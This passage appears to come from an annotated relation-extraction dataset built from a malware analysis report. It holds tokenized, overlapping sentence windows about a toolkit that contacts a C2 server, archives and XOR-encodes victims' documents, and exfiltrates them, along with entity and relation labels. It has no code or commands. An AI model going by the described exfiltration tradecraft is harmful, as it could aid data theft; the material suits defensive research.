0, "t": 2}, {"r": "FR", "evidence": [0], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1], "h": 3, "t": 4}, {"r": "CO", "evidence": [0, 1, 2], "h": 3, "t": 6}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 3, "t": 8}, {"r": "CO", "evidence": [0, 1, 2, 3, 4], "h": 3, "t": 11}, {"r": "ST", "evidence": [1], "h": 4, "t": 5}, {"r": "RF", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "RD", "evidence": [3], "h": 8, "t": 9}, {"r": "ST", "evidence": [3], "h": 8, "t": 10}, {"r": "RF", "evidence": [3], "h": 8, "t": 10}, {"r": "CO", "evidence": [5, 6], "h": 12, "t": 13}, {"r": "UK", "evidence": [6], "h": 13, "t": 14}, {"r": "WR", "evidence": [6], "h": 13, "t": 15}, {"r": "WR", "evidence": [6, 7], "h": 13, "t": 16}]}, {"title": "641-29", "sents": [["The", "first", "step", "inside", "the", "loop", "is", "to", "contact", "the", "C2", "over", "HTTPS", "."], ["On", "the", "first", "contact", ",", "it", "will", "send", "an", "identification", "of", "the", "victim", "based", "on", "the", "hard", "disk", "volume", "serial", "number", "."], ["Contact", "C2", "loop", "After", "a", "6,050-", "milliseconds", "delay", ",", "it", "will", "search", "for", "``", "sft", "''", "files", "(", "the", "encoded", "archive", "containing", "the", "documents", "to", "be", "exfiltrated", ")", ",", "which", "will", "then", "be", "exfiltrated", "to", "the", "C2", "."], ["Afterward", ",", "it", "will", "sleep", "for", "another", "6,050", "milliseconds", "before", "restarting", "."], ["Document", "search", "module", ":", "Mssqldbserv.xml", "This", "module", "has", "been", "described", "before", "in", "the", "article", "here", "."], ["The", "purpose", "of", "this", "tool", "is", "to", "parse", "the", "hard", "drive", "for", "files", "with", "a", "specific", "extension", "and", "create", "an", "archive", "with", "these", "files", "."], ["Finally", ",", "the", "archive", "is", "encoded", "before", "being", "sent", "to", "the", "C2.mssqldbserv.xml", "main", "function", "However", ",", "there", "are", "some", "interesting", "details", "we", "decided", "to", "share", "."], ["The", "first", "instructions", "in", "the", "main", "function", "hide", "the", "console", "window", "from", "the", "user", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "loop", "pos": [5, 6], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [10, 10], "name": "C2", "pos": [10, 11], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "it", "pos": [5, 6], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [23, 23], "name": "identification", "pos": [9, 10], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [45, 45], "name": "it", "pos": [9, 10], "index": "4_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [50, 50], "name": "sft", "pos": [14, 15], "index": "5_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [72, 72], "name": "C2", "pos": [36, 37], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [76, 76], "name": "it", "pos": [2, 3], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [86, 86], "name": "Document search module", "pos": [0, 3], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [106, 106], "name": "tool", "pos": [4, 5], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [111, 111], "name": "hard drive", "pos": [9, 11], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [122, 122], "name": "archive", "pos": [20, 21], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [130, 130], "name": "archive", "pos": [3, 4], "index": "12_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "RD", "evidence": [2], "h": 4, "t": 5}, {"r": "ST", "evidence": [2], "h": 4, "t": 6}, {"r": "RF", "evidence": [2], "h": 4, "t": 6}, {"r": "CO", "evidence": [4, 5], "h": 8, "t": 9}, {"r": "UK", "evidence": [5], "h": 9, "t": 10}, {"r": "WR", "evidence": [5], "h": 9, "t": 11}, {"r": "WR", "evidence": [5, 6], "h": 9, "t": 12}]}, {"title": "641-30", "sents": [["On", "the", "first", "contact", ",", "it", "will", "send", "an", "identification", "of", "the", "victim", "based", "on", "the", "hard", "disk", "volume", "serial", "number", "."], ["Contact", "C2", "loop", "After", "a", "6,050-", "milliseconds", "delay", ",", "it", "will", "search", "for", "``", "sft", "''", "files", "(", "the", "encoded", "archive", "containing", "the", "documents", "to", "be", "exfiltrated", ")", ",", "which", "will", "then", "be", "exfiltrated", "to", "the", "C2", "."], ["Afterward", ",", "it", "will", "sleep", "for", "another", "6,050", "milliseconds", "before", "restarting", "."], ["Document", "search", "module", ":", "Mssqldbserv.xml", "This", "module", "has", "been", "described", "before", "in", "the", "article", "here", "."], ["The", "purpose", "of", "this", "tool", "is", "to", "parse", "the", "hard", "drive", "for", "files", "with", "a", "specific", "extension", "and", "create", "an", "archive", "with", "these", "files", "."], ["Finally", ",", "the", "archive", "is", "encoded", "before", "being", "sent", "to", "the", "C2.mssqldbserv.xml", "main", "function", "However", ",", "there", "are", "some", "interesting", "details", "we", "decided", "to", "share", "."], ["The", "first", "instructions", "in", "the", "main", "function", "hide", "the", "console", "window", "from", "the", "user", "."], ["Afterward", ",", "the", "module", "will", "delete", "old", "``", "sft", "''", "files", "assuming", "they", "were", "already", "exfiltrated", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "it", "pos": [5, 6], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [9, 9], "name": "identification", "pos": [9, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [31, 31], "name": "it", "pos": [9, 10], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [36, 36], "name": "sft", "pos": [14, 15], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [58, 58], "name": "C2", "pos": [36, 37], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [62, 62], "name": "it", "pos": [2, 3], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [72, 72], "name": "Document search module", "pos": [0, 3], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [92, 92], "name": "tool", "pos": [4, 5], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [97, 97], "name": "hard drive", "pos": [9, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [108, 108], "name": "archive", "pos": [20, 21], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [116, 116], "name": "archive", "pos": [3, 4], "index": "10_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [157, 157], "name": "module", "pos": [3, 4], "index": "11_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [162, 162], "name": "sft", "pos": [8, 9], "index": "12_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [1], "h": 2, "t": 3}, {"r": "ST", "evidence": [1], "h": 2, "t": 4}, {"r": "RF", "evidence": [1], "h": 2, "t": 4}, {"r": "CO", "evidence": [3, 4], "h": 6, "t": 7}, {"r": "CO", "evidence": [3, 4, 5, 6, 7], "h": 6, "t": 11}, {"r": "UK", "evidence": [4], "h": 7, "t": 8}, {"r": "WR", "evidence": [4], "h": 7, "t": 9}, {"r": "WR", "evidence": [4, 5], "h": 7, "t": 10}, {"r": "UK", "evidence": [7], "h": 11, "t": 12}]}, {"title": "641-31", "sents": [["Contact", "C2", "loop", "After", "a", "6,050-", "milliseconds", "delay", ",", "it", "will", "search", "for", "``", "sft", "''", "files", "(", "the", "encoded", "archive", "containing", "the", "documents", "to", "be", "exfiltrated", ")", ",", "which", "will", "then", "be", "exfiltrated", "to", "the", "C2", "."], ["Afterward", ",", "it", "will", "sleep", "for", "another", "6,050", "milliseconds", "before", "restarting", "."], ["Document", "search", "module", ":", "Mssqldbserv.xml", "This", "module", "has", "been", "described", "before", "in", "the", "article", "here", "."], ["The", "purpose", "of", "this", "tool", "is", "to", "parse", "the", "hard", "drive", "for", "files", "with", "a", "specific", "extension", "and", "create", "an", "archive", "with", "these", "files", "."], ["Finally", ",", "the", "archive", "is", "encoded", "before", "being", "sent", "to", "the", "C2.mssqldbserv.xml", "main", "function", "However", ",", "there", "are", "some", "interesting", "details", "we", "decided", "to", "share", "."], ["The", "first", "instructions", "in", "the", "main", "function", "hide", "the", "console", "window", "from", "the", "user", "."], ["Afterward", ",", "the", "module", "will", "delete", "old", "``", "sft", "''", "files", "assuming", "they", "were", "already", "exfiltrated", "."], ["After", "a", "pause", "of", "6,500", "milliseconds", ",", "it", "will", "start", "its", "search", "for", "the", "targeted", "files", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "it", "pos": [9, 10], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [14, 14], "name": "sft", "pos": [14, 15], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [36, 36], "name": "C2", "pos": [36, 37], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [40, 40], "name": "it", "pos": [2, 3], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "Document search module", "pos": [0, 3], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [70, 70], "name": "tool", "pos": [4, 5], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [75, 75], "name": "hard drive", "pos": [9, 11], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [86, 86], "name": "archive", "pos": [20, 21], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [94, 94], "name": "archive", "pos": [3, 4], "index": "8_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [135, 135], "name": "module", "pos": [3, 4], "index": "9_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [140, 140], "name": "sft", "pos": [8, 9], "index": "10_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [156, 156], "name": "it", "pos": [7, 8], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [163, 163], "name": "targeted files", "pos": [14, 16], "index": "12_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 5}, {"r": "CO", "evidence": [2, 3, 4, 5, 6], "h": 4, "t": 9}, {"r": "CO", "evidence": [2, 3, 4, 5, 6, 7], "h": 4, "t": 11}, {"r": "UK", "evidence": [3], "h": 5, "t": 6}, {"r": "WR", "evidence": [3], "h": 5, "t": 7}, {"r": "WR", "evidence": [3, 4], "h": 5, "t": 8}, {"r": "UK", "evidence": [6], "h": 9, "t": 10}, {"r": "RD", "evidence": [7], "h": 11, "t": 12}]}, {"title": "641-32", "sents": [["Afterward", ",", "it", "will", "sleep", "for", "another", "6,050", "milliseconds", "before", "restarting", "."], ["Document", "search", "module", ":", "Mssqldbserv.xml", "This", "module", "has", "been", "described", "before", "in", "the", "article", "here", "."], ["The", "purpose", "of", "this", "tool", "is", "to", "parse", "the", "hard", "drive", "for", "files", "with", "a", "specific", "extension", "and", "create", "an", "archive", "with", "these", "files", "."], ["Finally", ",", "the", "archive", "is", "encoded", "before", "being", "sent", "to", "the", "C2.mssqldbserv.xml", "main", "function", "However", ",", "there", "are", "some", "interesting", "details", "we", "decided", "to", "share", "."], ["The", "first", "instructions", "in", "the", "main", "function", "hide", "the", "console", "window", "from", "the", "user", "."], ["Afterward", ",", "the", "module", "will", "delete", "old", "``", "sft", "''", "files", "assuming", "they", "were", "already", "exfiltrated", "."], ["After", "a", "pause", "of", "6,500", "milliseconds", ",", "it", "will", "start", "its", "search", "for", "the", "targeted", "files", "."], ["SFT", "file", "creation", "routine", "Using", "the", "working", "directory", "as", "a", "base", "path", ",", "which", "in", "this", "sample", "case", "is", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\", ",", "each", "selected", "file", "will", "be", "compressed", "into", "the", "file", "kr.zp", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "it", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [12, 12], "name": "Document search module", "pos": [0, 3], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [32, 32], "name": "tool", "pos": [4, 5], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [37, 37], "name": "hard drive", "pos": [9, 11], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [48, 48], "name": "archive", "pos": [20, 21], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [56, 56], "name": "archive", "pos": [3, 4], "index": "5_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [97, 97], "name": "module", "pos": [3, 4], "index": "6_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [102, 102], "name": "sft", "pos": [8, 9], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [118, 118], "name": "it", "pos": [7, 8], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [125, 125], "name": "targeted files", "pos": [14, 16], "index": "9_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [147, 147], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\", "pos": [19, 26], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [164, 164], "name": "kr.zp", "pos": [36, 37], "index": "11_0"}]], "labels": [{"r": "CO", "evidence": [1, 2], "h": 1, "t": 2}, {"r": "CO", "evidence": [1, 2, 3, 4, 5], "h": 1, "t": 6}, {"r": "CO", "evidence": [1, 2, 3, 4, 5, 6], "h": 1, "t": 8}, {"r": "UK", "evidence": [2], "h": 2, "t": 3}, {"r": "WR", "evidence": [2], "h": 2, "t": 4}, {"r": "WR", "evidence": [2, 3], "h": 2, "t": 5}, {"r": "UK", "evidence": [5], "h": 6, "t": 7}, {"r": "RD", "evidence": [6], "h": 8, "t": 9}, {"r": "WR", "evidence": [6, 7], "h": 8, "t": 10}, {"r": "WR", "evidence": [6, 7], "h": 8, "t": 11}]}, {"title": "641-33", "sents": [["Document", "search", "module", ":", "Mssqldbserv.xml", "This", "module", "has", "been", "described", "before", "in", "the", "article", "here", "."], ["The", "purpose", "of", "this", "tool", "is", "to", "parse", "the", "hard", "drive", "for", "files", "with", "a", "specific", "extension", "and", "create", "an", "archive", "with", "these", "files", "."], ["Finally", ",", "the", "archive", "is", "encoded", "before", "being", "sent", "to", "the", "C2.mssqldbserv.xml", "main", "function", "However", ",", "there", "are", "some", "interesting", "details", "we", "decided", "to", "share", "."], ["The", "first", "instructions", "in", "the", "main", "function", "hide", "the", "console", "window", "from", "the", "user", "."], ["Afterward", ",", "the", "module", "will", "delete", "old", "``", "sft", "''", "files", "assuming", "they", "were", "already", "exfiltrated", "."], ["After", "a", "pause", "of", "6,500", "milliseconds", ",", "it", "will", "start", "its", "search", "for", "the", "targeted", "files", "."], ["SFT", "file", "creation", "routine", "Using", "the", "working", "directory", "as", "a", "base", "path", ",", "which", "in", "this", "sample", "case", "is", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\", ",", "each", "selected", "file", "will", "be", "compressed", "into", "the", "file", "kr.zp", "."], ["The", "kr.zp", "data", "is", "then", "read", "and", "encoded", "using", "the", "same", "unusual", "encoded", "scheme.byte", "=", "byte", "XOR", "(", "byte", ">", ">", "4", ")", "If", "the", "file", "is", "larger", "than", "2048", "*", "53", "bytes", "(", "~", "106kb", ")", "it", "is", "split", "into", "chunks", "and", "saved", "into", "the", "sft", "files", "according", "to", "the", "naming", "convention", "below.gui_app0_", "[", "VolumeSerialNumber", "]", "_", "[", "MonthDay", "]", "_", "[", "Counter", "]", ".sftSince", "this", "module", "does", "not", "have", "a", "loop", ",", "it", "will", "only", "be", "executed", "at", "the", "communications", "module", "startup", ",", "which", "means", "that", "it", "is", "only", "executed", "once", "per", "service", "start", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Document search module", "pos": [0, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "tool", "pos": [4, 5], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [25, 25], "name": "hard drive", "pos": [9, 11], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [36, 36], "name": "archive", "pos": [20, 21], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [44, 44], "name": "archive", "pos": [3, 4], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [85, 85], "name": "module", "pos": [3, 4], "index": "5_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [90, 90], "name": "sft", "pos": [8, 9], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [106, 106], "name": "it", "pos": [7, 8], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [113, 113], "name": "targeted files", "pos": [14, 16], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [135, 135], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\", "pos": [19, 26], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [152, 152], "name": "kr.zp", "pos": [36, 37], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [155, 155], "name": "kr.zp", "pos": [1, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [200, 200], "name": "sft files", "pos": [46, 48], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [207, 207], "name": "below.gui_app0_", "pos": [53, 54], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [221, 221], "name": "module", "pos": [67, 68], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [242, 242], "name": "it", "pos": [88, 89], "index": "15_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 5}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5], "h": 0, "t": 7}, {"r": "UK", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 1, "t": 3}, {"r": "WR", "evidence": [1, 2], "h": 1, "t": 4}, {"r": "UK", "evidence": [4], "h": 5, "t": 6}, {"r": "RD", "evidence": [5], "h": 7, "t": 8}, {"r": "WR", "evidence": [5, 6], "h": 7, "t": 9}, {"r": "WR", "evidence": [5, 6], "h": 7, "t": 10}, {"r": "FR", "evidence": [5, 6, 7], "h": 7, "t": 13}, {"r": "CO", "evidence": [6, 7], "h": 10, "t": 11}, {"r": "WR", "evidence": [7], "t": 12, "h": 13}, {"r": "EX", "evidence": [7], "h": 13, "t": 15}, {"r": "CO", "evidence": [7], "h": 14, "t": 15}]}, {"title": "641-34", "sents": [["The", "purpose", "of", "this", "tool", "is", "to", "parse", "the", "hard", "drive", "for", "files", "with", "a", "specific", "extension", "and", "create", "an", "archive", "with", "these", "files", "."], ["Finally", ",", "the", "archive", "is", "encoded", "before", "being", "sent", "to", "the", "C2.mssqldbserv.xml", "main", "function", "However", ",", "there", "are", "some", "interesting", "details", "we", "decided", "to", "share", "."], ["The", "first", "instructions", "in", "the", "main", "function", "hide", "the", "console", "window", "from", "the", "user", "."], ["Afterward", ",", "the", "module", "will", "delete", "old", "``", "sft", "''", "files", "assuming", "they", "were", "already", "exfiltrated", "."], ["After", "a", "pause", "of", "6,500", "milliseconds", ",", "it", "will", "start", "its", "search", "for", "the", "targeted", "files", "."], ["SFT", "file", "creation", "routine", "Using", "the", "working", "directory", "as", "a", "base", "path", ",", "which", "in", "this", "sample", "case", "is", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\", ",", "each", "selected", "file", "will", "be", "compressed", "into", "the", "file", "kr.zp", "."], ["The", "kr.zp", "data", "is", "then", "read", "and", "encoded", "using", "the", "same", "unusual", "encoded", "scheme.byte", "=", "byte", "XOR", "(", "byte", ">", ">", "4", ")", "If", "the", "file", "is", "larger", "than", "2048", "*", "53", "bytes", "(", "~", "106kb", ")", "it", "is", "split", "into", "chunks", "and", "saved", "into", "the", "sft", "files", "according", "to", "the", "naming", "convention", "below.gui_app0_", "[", "VolumeSerialNumber", "]", "_", "[", "MonthDay", "]", "_", "[", "Counter", "]", ".sftSince", "this", "module", "does", "not", "have", "a", "loop", ",", "it", "will", "only", "be", "executed", "at", "the", "communications", "module", "startup", ",", "which", "means", "that", "it", "is", "only", "executed", "once", "per", "service", "start", "."], ["Mysterious", "Wintask.xmlOur", "initial", "analysis", "in", "a", "sandbox", "showed", "that", "the", "C2", "contact", "module", "attempts", "to", "execute", "this", "file", ",", "searching", "for", "it", "in", "the", "same", "path", "as", "the", "document", "search", "module", ",", "which", "we", "further", "corroborated", "with", "manual", "analysis", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "tool", "pos": [4, 5], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "hard drive", "pos": [9, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [20, 20], "name": "archive", "pos": [20, 21], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "archive", "pos": [3, 4], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [69, 69], "name": "module", "pos": [3, 4], "index": "4_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [74, 74], "name": "sft", "pos": [8, 9], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [90, 90], "name": "it", "pos": [7, 8], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [97, 97], "name": "targeted files", "pos": [14, 16], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [119, 119], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\", "pos": [19, 26], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [136, 136], "name": "kr.zp", "pos": [36, 37], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [139, 139], "name": "kr.zp", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [184, 184], "name": "sft files", "pos": [46, 48], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [191, 191], "name": "below.gui_app0_", "pos": [53, 54], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [205, 205], "name": "module", "pos": [67, 68], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [226, 226], "name": "it", "pos": [88, 89], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [245, 245], "name": "C2 contact module", "pos": [10, 13], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [252, 252], "name": "file", "pos": [17, 18], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [256, 256], "name": "it", "pos": [21, 22], "index": "17_0"}]], "labels": [{"r": "UK", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "UK", "evidence": [3], "h": 4, "t": 5}, {"r": "RD", "evidence": [4], "h": 6, "t": 7}, {"r": "WR", "evidence": [4, 5], "h": 6, "t": 8}, {"r": "WR", "evidence": [4, 5], "h": 6, "t": 9}, {"r": "FR", "evidence": [4, 5, 6], "h": 6, "t": 12}, {"r": "CO", "evidence": [5, 6], "h": 9, "t": 10}, {"r": "WR", "evidence": [6], "t": 11, "h": 12}, {"r": "EX", "evidence": [6], "h": 12, "t": 14}, {"r": "CO", "evidence": [6], "h": 13, "t": 14}, {"r": "EX", "evidence": [7], "h": 15, "t": 16}, {"r": "CO", "evidence": [7], "h": 16, "t": 17}]}, {"title": "641-35", "sents": [["Finally", ",", "the", "archive", "is", "encoded", "before", "being", "sent", "to", "the", "C2.mssqldbserv.xml", "main", "function", "However", ",", "there", "are", "some", "interesting", "details", "we", "decided", "to", "share", "."], ["The", "first", "instructions", "in", "the", "main", "function", "hide", "the", "console", "window", "from", "the", "user", "."], ["Afterward", ",", "the", "module", "will", "delete", "old", "``", "sft", "''", "files", "assuming", "they", "were", "already", "exfiltrated", "."], ["After", "a", "pause", "of", "6,500", "milliseconds", ",", "it", "will", "start", "its", "search", "for", "the", "targeted", "files", "."], ["SFT", "file", "creation", "routine", "Using", "the", "working", "directory", "as", "a", "base", "path", ",", "which", "in", "this", "sample", "case", "is", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\", ",", "each", "selected", "file", "will", "be", "compressed", "into", "the", "file", "kr.zp", "."], ["The", "kr.zp", "data", "is", "then", "read", "and", "encoded", "using", "the", "same", "unusual", "encoded", "scheme.byte", "=", "byte", "XOR", "(", "byte", ">", ">", "4", ")", "If", "the", "file", "is", "larger", "than", "2048", "*", "53", "bytes", "(", "~", "106kb", ")", "it", "is", "split", "into", "chunks", "and", "saved", "into", "the", "sft", "files", "according", "to", "the", "naming", "convention", "below.gui_app0_", "[", "VolumeSerialNumber", "]", "_", "[", "MonthDay", "]", "_", "[", "Counter", "]", ".sftSince", "this", "module", "does", "not", "have", "a", "loop", ",", "it", "will", "only", "be", "executed", "at", "the", "communications", "module", "startup", ",", "which", "means", "that", "it", "is", "only", "executed", "once", "per", "service", "start", "."], ["Mysterious", "Wintask.xmlOur", "initial", "analysis", "in", "a", "sandbox", "showed", "that", "the", "C2", "contact", "module", "attempts", "to", "execute", "this", "file", ",", "searching", "for", "it", "in", "the", "same", "path", "as", "the", "document", "search", "module", ",", "which", "we", "further", "corroborated", "with", "manual", "analysis", "."], ["All", "files", "in", "the", "toolkit", "are", "dropped", "by", "the", "trojanized", "software", "and", "it", "'s", "clear", "that", "the", "C2", "contact", "module", "expects", "this", "file", "to", "exist", "(", "the", "specific", "name", "changes", "form", "dropper", "to", "dropper", ")", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [3, 3], "name": "archive", "pos": [3, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [44, 44], "name": "module", "pos": [3, 4], "index": "1_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [49, 49], "name": "sft", "pos": [8, 9], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [65, 65], "name": "it", "pos": [7, 8], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [72, 72], "name": "targeted files", "pos": [14, 16], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [94, 94], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\", "pos": [19, 26], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [111, 111], "name": "kr.zp", "pos": [36, 37], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [114, 114], "name": "kr.zp", "pos": [1, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [159, 159], "name": "sft files", "pos": [46, 48], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [166, 166], "name": "below.gui_app0_", "pos": [53, 54], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [180, 180], "name": "module", "pos": [67, 68], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [201, 201], "name": "it", "pos": [88, 89], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [220, 220], "name": "C2 contact module", "pos": [10, 13], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [227, 227], "name": "file", "pos": [17, 18], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [231, 231], "name": "it", "pos": [21, 22], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [251, 251], "name": "files", "pos": [1, 2], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [259, 259], "name": "trojanized software", "pos": [9, 11], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [267, 267], "name": "C2 contact module", "pos": [17, 20], "index": "17_0"}]], "labels": [{"r": "UK", "evidence": [2], "h": 1, "t": 2}, {"r": "RD", "evidence": [3], "h": 3, "t": 4}, {"r": "WR", "evidence": [3, 4], "h": 3, "t": 5}, {"r": "WR", "evidence": [3, 4], "h": 3, "t": 6}, {"r": "FR", "evidence": [3, 4, 5], "h": 3, "t": 9}, {"r": "CO", "evidence": [4, 5], "h": 6, "t": 7}, {"r": "WR", "evidence": [5], "t": 8, "h": 9}, {"r": "EX", "evidence": [5], "h": 9, "t": 11}, {"r": "CO", "evidence": [5], "h": 10, "t": 11}, {"r": "EX", "evidence": [6], "h": 12, "t": 13}, {"r": "CO", "evidence": [6], "h": 13, "t": 14}, {"r": "CO", "evidence": [6, 7], "h": 12, "t": 17}, {"r": "WR", "evidence": [7], "t": 15, "h": 16}]}, {"title": "641-36", "sents": [["The", "first", "instructions", "in", "the", 